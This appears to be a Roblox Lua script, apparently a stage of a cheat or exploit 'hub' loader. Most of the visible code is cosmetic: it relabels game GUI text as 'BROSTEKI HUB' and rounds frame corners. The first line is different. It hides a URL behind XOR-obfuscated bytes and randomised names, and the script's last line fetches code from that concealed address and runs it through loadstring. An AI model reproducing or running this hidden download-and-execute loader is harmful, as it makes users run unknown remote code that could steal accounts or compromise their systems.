
--[[ STAGE 2: VISUAL CORE ]]
local hiHWBrsXV_NL="\027\044\049\050\056\006\254\003\077\063\090\024\084\091\109\102\118\106\128\131\122\142\130\147\153\164\152\168\179\114\170\187\190\133\203\207\213\203\220\217\230\223\243\251\243\193\251\016\010\009\022\039\022\040\045\243\054\047\060\072\012\099\092\098\096\035\140\117\106\125\133\179\160\179\172\199\185\167\163\177\183\185\192\239\222\202\199\205\217\215\233\221\028\021\246\001\005\249\000\063\217\220\224\236\030\239\247\253\253\064\076\061"local WCzckAMu0QuYFrA5=33 local Y2y53LwRu8SnQbfp=198 local _KTWyPw_WcTvMIc0nK=0 local RvEZplf1U7Sa7qjNU=5 local Mu5o_PITFiO5THG_N=7 local waxbX5R2ENVjE=false local c5vBky3PC8EUP=bit32 and bit32.bxor if not c5vBky3PC8EUP then c5vBky3PC8EUP=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Fl8601jZ99a2YftzWXRe={}for BREkEEpFrHPZ=1,#hiHWBrsXV_NL do local b7RHDV05y5PYwwwLRzq=string.byte(hiHWBrsXV_NL,BREkEEpFrHPZ)local iTtGq1xOh0tZSungGSLeKB=(Y2y53LwRu8SnQbfp+(BREkEEpFrHPZ*RvEZplf1U7Sa7qjNU)+Mu5o_PITFiO5THG_N)%256 if _KTWyPw_WcTvMIc0nK==0 then b7RHDV05y5PYwwwLRzq=(b7RHDV05y5PYwwwLRzq-iTtGq1xOh0tZSungGSLeKB)%256 Fl8601jZ99a2YftzWXRe[BREkEEpFrHPZ]=string.char(c5vBky3PC8EUP(b7RHDV05y5PYwwwLRzq,WCzckAMu0QuYFrA5))else b7RHDV05y5PYwwwLRzq=c5vBky3PC8EUP(b7RHDV05y5PYwwwLRzq,WCzckAMu0QuYFrA5)Fl8601jZ99a2YftzWXRe[BREkEEpFrHPZ]=string.char((b7RHDV05y5PYwwwLRzq-iTtGq1xOh0tZSungGSLeKB)%256)end end local yerb4Gd7066M3bQiTz=table.concat(Fl8601jZ99a2YftzWXRe)if waxbX5R2ENVjE then yerb4Gd7066M3bQiTz=string.reverse(yerb4Gd7066M3bQiTz)end local aedshNFGpjo9CmR=yerb4Gd7066M3bQiTz
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(aedshNFGpjo9CmR))()
